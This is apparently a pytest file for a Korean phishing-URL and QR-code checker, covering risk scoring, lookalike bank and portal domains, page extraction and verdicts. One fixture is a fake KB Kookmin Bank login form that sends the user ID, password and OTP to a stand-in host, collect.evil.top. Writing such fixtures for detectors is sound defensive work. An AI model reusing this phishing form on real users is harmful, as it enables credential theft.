"""검사 로직 단위 테스트 (네트워크 사용 안 함).  실행: .venv\\Scripts\\python -m pytest"""
import cv2

from app.analyzer import ai_signal, analyze, url_structure_signals
from app.brand import find_lookalike
from app.page import extract
from app.qr_decode import decode_image
from app.scoring import make_signal, score


# ---------- 점수 계산 ----------
def test_weak_signals_only_reach_caution_at_most():
    weak = [make_signal(s, "") for s in ("http", "long_url", "many_subdomains", "encoded_chars", "at_symbol", "punycode",
                                            "suspicious_tld", "form_posts_elsewhere", "hosting_platform")]
    r = score(weak)
    assert r["breakdown"]["weak"] == r["breakdown"]["weak_cap"]  # 상한 적용
    assert r["verdict"] == "caution"


def test_confirmed_signal_is_danger_even_with_safe_signals():
    r = score([make_signal("phishing_db", ""), make_signal("trusted_site", ""), make_signal("old_domain", "")])
    assert r["verdict"] == "danger"


def test_combo_rule_http_with_sensitive_form():
    r = score([make_signal("http", ""), make_signal("sensitive_form", "")])
    assert any(x["id"] == "http_sensitive_form" for x in r["risk_reasons"])


def test_http_without_form_stays_weak():
    r = score([make_signal("http", "")])
    assert r["verdict"] == "safe"


def test_safe_signals_reduce_score():
    r = score([make_signal("new_domain", ""), make_signal("valid_cert", "")])
    assert r["score"] == 30 - 5


# ---------- URL 구조 ----------
def test_url_structure_signals():
    ids = {s["id"] for s in url_structure_signals("http://user@login.secure.verify.account.example.xyz/a?" + "&".join(f"p{i}=1" for i in range(8)))}
    assert {"at_symbol", "many_subdomains", "many_params", "suspicious_tld"} <= ids


# ---------- 브랜드 유사 도메인 ----------
def test_lookalike_typo():
    assert find_lookalike("navver.com")["brand"]["name"] == "네이버"
    assert find_lookalike("www.kbstar-login.xyz")["brand"]["name"] == "국민은행"
    assert find_lookalike("naver.com.secure-check.top")["brand"]["name"] == "네이버"


def test_official_domain_is_not_lookalike():
    assert find_lookalike("nid.naver.com") is None
    assert find_lookalike("www.kbstar.com") is None
    assert find_lookalike("example.com") is None


# ---------- 페이지 추출 ----------
LOGIN_HTML = """<html><head><title>KB국민은행 인터넷뱅킹</title></head><body>
<form action="https://collect.evil.top/send.php"><input name="userid"><input type="password" name="pw">
<input name="otp" placeholder="OTP 인증번호"></form><img src="/img/kb_logo.png" alt="KB국민은행"></body></html>"""


def test_extract_sensitive_fields_and_external_action():
    page = extract(LOGIN_HTML, "https://kb-secure.example.com/login")
    assert set(page["sensitive_info"]) == {"비밀번호", "인증번호/OTP"}
    assert page["external_form_domains"] == ["evil.top"]
    assert page["title"] == "KB국민은행 인터넷뱅킹"


# ---------- 분석 파이프라인 (저장본 형식) ----------
def fake_snapshot(url, html, created="2026-11-01T00:00:00Z"):
    return {
        "url": url, "collected_at": "2026-11-04T00:00:00+00:00", "source": "test", "label": None, "html": html,
        "trace": {"input_url": url, "chain": [{"url": url, "status": 200}], "final_url": url, "status": 200,
                  "headers": {}, "content_type": "text/html", "is_download": False, "html_truncated": False, "error": None},
        "domain": {"checked": True, "domain": "", "created": created, "error": None},
        "cert": {"checked": False, "valid": None, "kind": None, "error": "https 아님"},
        "safe_browsing": {"checked": True, "matches": [], "error": None},
        "phish_feed": {"checked": True, "matches": [], "error": None},
    }


def test_analyze_phishing_like_page_is_danger():
    r = analyze(fake_snapshot("http://kbstar-login.xyz/", LOGIN_HTML), use_ai=False)
    ids = {x["id"] for x in r["risk_reasons"]}
    assert {"new_domain", "brand_lookalike", "brand_form_mismatch", "http_sensitive_form"} <= ids
    assert r["verdict"] == "danger"
    assert any(n["id"] == "http" for n in r["notices"])


def test_analyze_download_notice_does_not_change_verdict():
    snap = fake_snapshot("https://files.example.org/app.apk", "", created="2010-01-01T00:00:00Z")
    snap["trace"]["is_download"] = True
    snap["cert"] = {"checked": True, "valid": True, "kind": None, "error": None}
    r = analyze(snap, use_ai=False)
    assert r["verdict"] == "safe"
    assert [n["id"] for n in r["notices"]] == ["download"]


def test_malware_db_escalates_to_danger():
    snap = fake_snapshot("https://example.org/", "<title>hi</title>", created="2010-01-01T00:00:00Z")
    snap["safe_browsing"]["matches"] = [{"url": "https://example.org/", "threat_type": "MALWARE"}]
    assert analyze(snap, use_ai=False)["verdict"] == "danger"


# ---------- AI 결과 반영 ----------
def test_ai_impersonation_signal():
    ai = {"claimed_service": "국민은행", "page_purpose": "로그인", "requested_info": ["비밀번호", "인증번호/OTP"],
          "official_domain_guess": "kbstar.com", "confidence": 0.9, "reason": ""}
    sig, _ = ai_signal(ai, "kb-secure.example.com")
    assert sig["id"] == "ai_impersonation"
    assert ai_signal(ai, "obank.kbstar.com")[0] is None  # 공식 도메인이면 신호 없음


# ---------- QR 해독 ----------
def test_qr_decode_roundtrip():
    qr = cv2.QRCodeEncoder.create().encode("https://example.com/pay")
    qr = cv2.resize(qr, None, fx=8, fy=8, interpolation=cv2.INTER_NEAREST)
    qr = cv2.copyMakeBorder(qr, 40, 40, 40, 40, cv2.BORDER_CONSTANT, value=255)
    ok, png = cv2.imencode(".png", qr)
    assert decode_image(png.tobytes()) == ["https://example.com/pay"]
